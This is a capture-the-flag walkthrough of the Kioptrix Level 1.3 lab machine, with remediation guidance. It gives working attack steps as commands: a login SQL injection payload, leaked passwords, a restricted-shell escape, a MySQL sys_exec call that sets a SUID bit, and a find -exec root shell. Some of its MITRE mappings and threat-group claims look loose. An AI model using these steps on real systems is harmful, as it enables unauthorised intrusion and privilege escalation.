# Kioptrix: Level 1.3 (#4) — The Classic SQL Injection Gauntlet

Alright guys!! Kioptrix Level 1.3 is one of those OG boot2root machines that every beginner absolutely has to pop at least once. No cap, dude: SQL injection on a login form, a restricted shell that's trivially escapable, and MySQL running as root with no password. Every single layer here maps to something you'll find in the wild. This machine is basically a greatest hits of "what happens when devs don't follow basic security hygiene." Let's get it.

Big respect to Kioptrix for keeping these classics alive and accessible on VulnHub. Foundational stuff, fr fr.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Kioptrix: Level 1.3 (#4) |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/kioptrix-level-13-4,25/ |
| **Techniques** | Nmap service enumeration, SQLi authentication bypass, restricted shell escape (lshell), MySQL UDF sys_exec SUID abuse, GTFOBins find -exec |
| **CVEs** | CWE-89 (SQL Injection), CWE-250 (MySQL running as root), CWE-272 (Least Privilege Violation), CWE-522 (Insufficiently Protected Credentials) |
| **APT Groups** | FIN7: uses SQL injection for initial access against web login portals in financial and retail targets; APT41: documented abuse of MySQL UDF functions for OS command execution as part of post-exploitation lateral movement |

---

## Attack Summary

```
netdiscover / nmap
  → ports: 22 (SSH), 80 (HTTP login form)
  → dirb → /john, /robert (username hints)
  → SQL injection: john / ' or 1=1 #
  → credential leak: john:MyNameIsJohn, robert:ADGAdsafdfwt4gadfga==
  → SSH john@target:22
  → restricted shell (lshell): echo os.system('/bin/bash')
  → full bash shell
  → cat /var/www/checklogin.php → MySQL root (no password)
  → mysql -u root → SELECT sys_exec('chmod u+s /usr/bin/find')
  → /usr/bin/find now SUID root
  → find /tmp/raj -exec /bin/sh \;
  → uid=0(root)
  → cat /root/congrats.txt
```

---

## Methodology

1. Host discovery: netdiscover on local subnet
2. Full port scan and service enumeration with nmap
3. Directory brute-force to enumerate web paths and infer usernames
4. SQL injection authentication bypass on login form
5. SSH login with leaked credentials into restricted lshell
6. Restricted shell escape via Python os.system trick
7. Source code review to extract MySQL root credentials
8. MySQL UDF sys_exec to set SUID bit on /usr/bin/find
9. SUID find GTFOBins escalation to root
10. Flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
# Target: 192.168.1.106

nmap -A 192.168.1.106
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1
80/tcp open  http    Apache httpd 2.2.8
```

Two services: SSH and an HTTP login form. Web application with login is the primary attack surface.

**Real-world note:** Any internet-exposed login form should be treated as a SQL injection target during initial assessment. Unauthenticated endpoints with user input are consistently in the top findings across web application pentests.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Directory Brute-Force

```bash
dirb http://192.168.1.106
gobuster dir -u http://192.168.1.106 -w /usr/share/wordlists/dirb/common.txt
```

**Found directories:** `/john`, `/robert`

The directory names directly disclose valid usernames. This is information leakage before even touching the login form.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1589.001 — Gather Victim Identity Information: Credentials

---

## Step 3 — SQL Injection Authentication Bypass

Browse to `http://192.168.1.106`. The login form accepts username and password. Try SQL injection:

```
Username: john
Password: ' or 1=1 #
```

Login succeeds. The page leaks the actual credential stored in the database:

```
Username: john
Password: MyNameIsJohn
```

Try the same for `robert`:

```
Username: robert
Password: ' or 1=1 #
```

```
Username: robert
Password: ADGAdsafdfwt4gadfga==
```

**How it works:** The backend SQL query is something like:
```sql
SELECT * FROM users WHERE username='john' AND password='' or 1=1 #'
```

The `#` comments out the closing quote. `1=1` always evaluates to true, so the WHERE clause passes for any row. The application then displays the actual stored password (plaintext, legit insane).

**Real-world note:** SQL injection in login forms is consistently in OWASP Top 10 (A03 Injection). FIN7 used SQLi extensively in point-of-sale web application attacks against retail targets throughout 2017 to 2020. The use of `' or 1=1` variants is detected by virtually every WAF, but unprotected internal applications remain vulnerable in corporate environments.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1078 — Valid Accounts

---

## Step 4 — SSH Login and Restricted Shell Escape

```bash
ssh john@192.168.1.106
# Password: MyNameIsJohn
```

The shell is restricted: `lshell` (Limited Shell). Most commands are blocked. Check:

```
lshell> ls
lshell> /bin/bash  # → forbidden
```

Escape via Python os.system trick:

```bash
echo os.system('/bin/bash')
```

This works because `echo` is allowed in lshell, and Python interprets the argument. Result: full `bash` shell.

**Alternative escapes:**
```bash
# If Python is available:
python -c 'import os; os.system("/bin/bash")'

# Via ssh itself:
ssh john@192.168.1.106 /bin/bash
```

**Real-world note:** Restricted shells are not a security control. They are convenience features. `lshell`, `rbash`, and similar tools are consistently bypassed in minutes. A proper security boundary requires chroot jails, containers, or dedicated bastion architectures. OceanLotus (APT32) specifically looks for and bypasses restricted shells during post-exploitation to gain full command access.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Credential Discovery in Source Code

With a full bash shell, read the web application source:

```bash
cat /var/www/checklogin.php
```

```php
$host='localhost';
$username='root';
$password='';
$db_name='members';
```

MySQL root with no password. This is catastrophic.

**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials in Files

---

## Step 6 — MySQL UDF sys_exec SUID Escalation

Connect to MySQL as root (no password required):

```bash
mysql -u root
```

Use the `sys_exec` UDF (User Defined Function) to execute OS commands as the MySQL process owner (root):

```sql
SELECT sys_exec('chmod u+s /usr/bin/find');
```

Exit MySQL and verify:

```bash
quit
ls -la /usr/bin/find
# -rwsr-xr-x root root /usr/bin/find
```

`/usr/bin/find` is now SUID root. Any user can execute commands as root through it.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid; T1059.002 — Command and Scripting Interpreter: AppleScript (analogous: MySQL as OS command executor)

---

## Step 7 — GTFOBins: find -exec Root Shell

```bash
cd /tmp
touch raj
find raj -exec whoami \;
# root

find raj -exec /bin/sh \;
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Root shell achieved.** Read the flag:

```bash
cat /root/congrats.txt
```

(☞ﾟヮﾟ)☞ GG dude. Kioptrix 4 is done.

**Real-world note:** APT41 has been documented using MySQL UDF functions for OS command execution during post-exploitation of database servers. The `sys_exec` approach is particularly dangerous because it requires no compilation of exploit code, just SQL queries.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential (SQLi leak) | john:MyNameIsJohn | Web login SQLi | SSH access |
| Credential (SQLi leak) | robert:ADGAdsafdfwt4gadfga== | Web login SQLi | Alternative SSH |
| Credential (source) | root:(empty) | /var/www/checklogin.php | MySQL root access |
| Root shell | uid=0(root) | MySQL sys_exec UDF → SUID find | Full system access |
| Flag | /root/congrats.txt | /root/ | Proof of compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SQL injection leaks plaintext passwords | Login SQLi is OWASP A03; plaintext storage is A02 Cryptographic Failures | Use parameterized queries; hash passwords with bcrypt/Argon2 |
| 2 | Username disclosure via directory listing | Information leakage reduces attacker effort to zero for user enumeration | Disable directory listing; don't use usernames as URL paths |
| 3 | Restricted shell (lshell) bypassed in seconds | Restricted shells are not a security boundary in any standard or framework | Use proper chroot jails, containers, or bastion hosts with MFA |
| 4 | MySQL running as root with no password | MySQL root on OS root is direct privilege escalation for any SQL user | Run MySQL as dedicated low-privilege user; always set a strong root password |
| 5 | sys_exec UDF grants OS root from SQL | Documented by APT41 in targeted intrusions against database servers | Remove UDF; revoke FILE/SUPER MySQL privileges from app accounts |
| 6 | Credentials in PHP source under web root | Common finding in legacy PHP applications; often accessible via LFI or directory traversal | Store credentials in environment variables or secrets managers, never in web-accessible files |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | SQL Injection Credential Extraction | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Defense Evasion | Defense Evasion | Restricted Shell Escape | T1059.004 |
| Privilege Escalation | Privilege Escalation | Setuid and Setgid Abuse | T1548.001 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Persistence | Persistence | Valid Accounts | T1078 |

---

## Remediation and Containment

### Technical Fixes

1. **Fix SQL injection**: Use PDO prepared statements or MySQLi parameterized queries in all login functions; never concatenate user input into SQL strings
2. **Hash passwords**: Store passwords with bcrypt (cost factor 12+) or Argon2id; never store plaintext
3. **Disable directory listing**: Set `Options -Indexes` in Apache config; remove username-named directories
4. **Replace restricted shell**: Implement proper chroot jails or containerized environments for limited-access SSH users
5. **Secure MySQL**: Set a strong root password; run mysqld as a dedicated `mysql` user (never root); remove sys_exec UDF
6. **Remove app DB credentials from source**: Store in environment variables; use `.env` files outside web root

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory web applications and database services; map trust boundaries |
| Protect | Access Control | Disable anonymous MySQL root; enforce least privilege for DB accounts |
| Protect | Data Security | Hash all passwords; remove plaintext credential storage |
| Detect | Anomalies and Events | Alert on SQL error patterns; monitor MySQL for sys_exec calls |
| Respond | Response Planning | Block remote MySQL access; rotate all credentials on compromise |
| Recover | Recovery Planning | Rebuild from clean image; audit all PHP source for further SQLi |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-10 | Information Input Validation | Validate and sanitize all login form inputs; use prepared statements |
| IA-5 | Authenticator Management | Hash passwords; enforce complexity; rotate on compromise |
| AC-6 | Least Privilege | MySQL runs as dedicated user; no SUPER or FILE privileges for app accounts |
| CM-7 | Least Functionality | Disable unused MySQL UDFs; disable directory listing in Apache |
| SC-28 | Protection of Information at Rest | No plaintext credentials in source files or web-accessible directories |

### CISA KEV

SQL injection (CWE-89) features across multiple CISA KEV entries including vulnerabilities in Drupal, vBulletin, and various PHP frameworks. CISA BOD 22-01 requires federal agencies to remediate SQL injection vulnerabilities within defined timeframes. The MySQL root no-password pattern enabled full OS compromise, consistent with CISA Alert AA21-209A documenting database exploitation paths.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Identities and Credentials | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Situational Awareness (SITUATION) | Implement Logging | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (parameterized queries; disable directory listing)
- **D3-OAM** — Operating System Administrative Management (MySQL non-root user; remove UDF)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in deployed application source)
- **D3-DQSA** — Database Query String Analysis (detect SQLi patterns in query logs)

---

## Final Thoughts

Kioptrix 4 is a perfect learning machine for demonstrating how a single SQL injection can cascade into full system compromise when combined with misconfigurations at every layer. The attack chain is clean: SQLi, lshell escape, MySQL root, SUID abuse. Each step is a real technique used in production intrusions by groups like FIN7 and APT41.

The machine teaches patience and systematic enumeration. The directory leak, the SQLi bypass, the credential in PHP source, the UDF trick: each one is a real finding from real engagements. Highly recommended for anyone studying for OSCP or building their CTF fundamentals.

Thanks guys!! (❍ᴥ❍ʋ)
